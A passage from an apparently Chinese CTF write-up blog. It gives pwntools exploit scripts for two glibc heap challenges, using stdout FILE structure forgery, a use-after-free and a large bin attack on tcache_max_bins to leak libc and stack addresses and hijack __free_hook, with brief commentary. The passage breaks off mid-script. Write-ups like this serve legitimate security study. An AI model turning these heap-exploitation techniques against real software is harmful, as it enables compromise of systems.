p16<span class=\"token punctuation\">(</span>low_addr<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span> <span class=\"token punctuation\">,</span> p16<span class=\"token punctuation\">(</span>low_addr<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n\n    fake_io <span class=\"token operator\">=</span>  <span class=\"token string\">\"\\x00\"</span><span class=\"token operator\">*</span><span class=\"token number\">0x33</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xfbad1800</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">3</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"\\x00\"</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span> <span class=\"token punctuation\">,</span> fake_io<span class=\"token punctuation\">)</span>\n    leak <span class=\"token operator\">=</span> l64<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> leak <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>\n        exit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n    lg<span class=\"token punctuation\">(</span><span class=\"token string\">'leak'</span><span class=\"token punctuation\">,</span>leak<span class=\"token punctuation\">)</span>\n\n    _IO_2_1_stdout_ <span class=\"token operator\">=</span> leak <span class=\"token operator\">+</span> <span class=\"token number\">0x20</span>\n    libc<span class=\"token punctuation\">.</span>address <span class=\"token operator\">=</span> _IO_2_1_stdout_ <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_2_1_stdout_'</span><span class=\"token punctuation\">]</span>\n    environ <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__environ'</span><span class=\"token punctuation\">]</span>\n    lg<span class=\"token punctuation\">(</span><span class=\"token string\">'_IO_2_1_stdout_'</span><span class=\"token punctuation\">,</span>_IO_2_1_stdout_<span class=\"token punctuation\">)</span>\n    io_chunk <span class=\"token operator\">=</span> _IO_2_1_stdout_ <span class=\"token operator\">-</span> <span class=\"token number\">0x43</span>\n    \n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0xf0</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span>\n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x160</span> <span class=\"token punctuation\">,</span>  <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0xf8</span> <span class=\"token operator\">+</span> flat<span class=\"token punctuation\">(</span><span class=\"token number\">0x71</span> <span class=\"token punctuation\">,</span> io_chunk <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">3</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span>\n\n    fake_io <span class=\"token operator\">=</span> <span class=\"token string\">\"\\x00\"</span><span class=\"token operator\">*</span><span class=\"token number\">0x33</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xfbad1800</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">3</span> <span class=\"token operator\">+</span> flat<span class=\"token punctuation\">(</span>environ <span class=\"token operator\">-</span> <span class=\"token number\">0x8</span> <span class=\"token punctuation\">,</span> environ <span class=\"token operator\">+</span> <span class=\"token number\">0x8</span><span class=\"token punctuation\">)</span>\n\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">2</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span> <span class=\"token punctuation\">,</span> fake_io <span class=\"token punctuation\">)</span>\n    stack_addr <span class=\"token operator\">=</span> l64<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    lg<span class=\"token punctuation\">(</span><span class=\"token string\">'stack_addr'</span><span class=\"token punctuation\">,</span>stack_addr<span class=\"token punctuation\">)</span>\n\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">2</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x18</span> <span class=\"token punctuation\">,</span> flat<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x31</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">2</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span> <span class=\"token punctuation\">,</span> flat<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x31</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">3</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span> <span class=\"token punctuation\">,</span> flat<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x31</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span> <span class=\"token punctuation\">,</span> flat<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x31</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span> <span class=\"token punctuation\">,</span> flat<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x31</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n\n    eadd<span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span>\n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">,</span> p16<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>addr<span class=\"token operator\">&amp;</span> <span class=\"token number\">0xf000</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">0xbf0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x28</span> <span class=\"token punctuation\">,</span> p16<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>addr<span class=\"token operator\">&amp;</span> <span class=\"token number\">0xf000</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">0xbf0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">,</span> flat<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x30</span><span class=\"token operator\">*</span><span class=\"token number\">4</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x70</span><span class=\"token operator\">*</span><span class=\"token number\">4</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span>\n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x28</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span>\n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x28</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x70</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span>\n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x40</span> <span class=\"token punctuation\">,</span>  <span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">0x98</span>  <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x71</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>io_chunk<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span> <span class=\"token punctuation\">)</span>\n    flag_addr <span class=\"token operator\">=</span> stack_addr <span class=\"token operator\">-</span> <span class=\"token number\">0x188</span>\n\n    lg<span class=\"token punctuation\">(</span><span class=\"token string\">'flag_addr'</span><span class=\"token punctuation\">,</span>flag_addr<span class=\"token punctuation\">)</span>\n    fake_io <span class=\"token operator\">=</span> <span class=\"token string\">\"\\x00\"</span><span class=\"token operator\">*</span><span class=\"token number\">0x33</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xfbad1800</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">3</span> <span class=\"token operator\">+</span> flat<span class=\"token punctuation\">(</span>flag_addr <span class=\"token punctuation\">,</span>flag_addr <span class=\"token operator\">+</span> <span class=\"token number\">0x50</span><span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span> <span class=\"token punctuation\">,</span> fake_io<span class=\"token punctuation\">)</span>\n    \n\n    p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># attack()</span>\nexhaust<span class=\"token punctuation\">(</span>attack<span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n@File    :   lemon_pwn.py\n@Time    :   2021/08/21 11:59:54\n@Author  :   Niyah \n'''</span></code></pre>\n<h1 id=\"passwordbox_proversion\"><a class=\"markdownIt-Anchor\" href=\"#passwordbox_proversion\">#</a> PassWordBox_ProVersion</h1>\n<p>接下来就是我没有做出来的题了，说实话这题准备用 ha1vk 师傅的 house of banana 方法做的，但是就是差那么一点点</p>\n<p>这题的洞比前面那题还简单，纯纯的 uaf，但是只能申请 large bin 范围里边的堆块，这时候就需要考虑 large bin attack 了，large bin attack 可以向一个地址写一个很大的值，官方解法是向 tcache_max_bins 写一个很大的值，让不属于 tcache 的比较大的堆块也属于 tcache  ，有了 tcache 后就随便打了</p>\n<blockquote>\n<p>tcache_max_bins 储存了 tcache 的种类数量，一个我不知道的知识点，还是太菜了</p>\n</blockquote>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># -*- encoding: utf-8 -*-</span>\n<span class=\"token keyword\">import</span> sys \n<span class=\"token keyword\">import</span> os \n<span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span> \ncontext<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span> \n<span class=\"token comment\">#context.update( os = 'linux', arch = 'amd64',timeout = 1)</span>\nbinary <span class=\"token operator\">=</span> <span class=\"token string\">'./pwdPro'</span>\nelf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\nlibc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n<span class=\"token comment\">#libc = ELF('')</span>\ncontext<span class=\"token punctuation\">.</span>binary <span class=\"token operator\">=</span> binary\nDEBUG <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\n<span class=\"token keyword\">if</span> DEBUG<span class=\"token punctuation\">:</span>\n    p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\n    libc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n    <span class=\"token comment\">#p = process(['qemu-arm', binary])</span>\n    <span class=\"token comment\">#p = process(['qemu-aarch64','-L','',binary])</span>\n    <span class=\"token comment\">#p = process(['qemu-aarch64','-L','',-g,'1234',binary])</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    host <span class=\"token operator\">=</span> <span class=\"token string\">'47.104.71.220'</span>\n    port <span class=\"token operator\">=</span> <span class=\"token string\">'38562'</span>\n    p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\n\nl64 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nl32 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\xf7'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsla <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsa  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nlg  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> name<span class=\"token punctuation\">,</span>data  <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span>name <span class=\"token operator\">+</span> <span class=\"token string\">': 0x%x'</span> <span class=\"token operator\">%</span> data<span class=\"token punctuation\">)</span>\nse  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nrl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nsl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nru  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nrint<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x <span class=\"token operator\">=</span> <span class=\"token number\">12</span>     <span class=\"token punctuation\">:</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">dbg</span><span class=\"token punctuation\">(</span> b <span class=\"token operator\">=</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>b <span class=\"token operator\">==</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\n        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span><span class=\"token string\">'b %s'</span><span class=\"token operator\">%</span>b<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">cmd</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">':'</span><span class=\"token punctuation\">,</span>num<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">,</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">,</span>size<span class=\"token punctuation\">,</span>pwd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Which PwdBox You Want Add:'</span><span class=\"token punctuation\">,</span>idx<span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Input The ID You Want Save:'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Length Of Your Pwd:'</span><span class=\"token punctuation\">,</span>size<span class=\"token punctuation\">)</span>\n    sa<span class=\"token punctuation\">(</span><span class=\"token string\">'Your Pwd:'</span><span class=\"token punctuation\">,</span>pwd<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">delete</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Idx you want 2 Delete:'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Want Check:'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">,</span>text<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Which PwdBox You Want Edit:'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span>\n    sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span>\n    se<span class=\"token punctuation\">(</span>text<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">recovery</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Idx you want 2 Recover:'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">decode</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">global</span> key\n    rst <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        rst <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span> u64 <span class=\"token punctuation\">(</span> payload<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">:</span>i<span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> key<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> rst\n\n<span class=\"token comment\"># 总结 如果知道 large bin attack 后续操作那将会是非常简单的一道题</span>\n\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0</span> <span class=\"token punctuation\">,</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x528</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">8</span> <span class=\"token operator\">+</span> <span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span>\nru<span class=\"token punctuation\">(</span><span class=\"token string\">'Save ID:'</span><span class=\"token punctuation\">)</span>\nkey <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nlg<span class=\"token punctuation\">(</span><span class=\"token string\">'key'</span><span class=\"token punctuation\">,</span>key<span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token punctuation\">,</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x500</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">8</span> <span class=\"token operator\">+</span> <span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">2</span> <span class=\"token punctuation\">,</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x518</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">8</span> <span class=\"token operator\">+</span> <span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">3</span> <span class=\"token punctuation\">,</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x500</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">8</span> <span class=\"token operator\">+</span> <span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">9</span> <span class=\"token punctuation\">,</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x500</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">8</span> <span class=\"token operator\">+</span> <span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span>\n\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\nrecovery<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># dbg()</span>\nshow<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\nru<span class=\"token punctuation\">(</span><span class=\"token string\">'Pwd is: '</span><span class=\"token punctuation\">)</span>\nleak <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> key \n\n__malloc_hook <span class=\"token operator\">=</span> leak <span class=\"token operator\">-</span> <span class=\"token number\">0x70</span>\nglobal_max_fast <span class=\"token operator\">=</span> leak <span class=\"token operator\">+</span> <span class=\"token number\">0x2fa0</span>\nlibc<span class=\"token punctuation\">.</span>address <span class=\"token operator\">=</span> __malloc_hook <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">]</span>\ntcache_max_bins <span class=\"token operator\">=</span> <span class=\"token number\">0x1eb2d0</span> <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>address\n__free_hook <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__free_hook'</span><span class=\"token punctuation\">]</span>\nsystem <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span>\n\nlg<span class=\"token 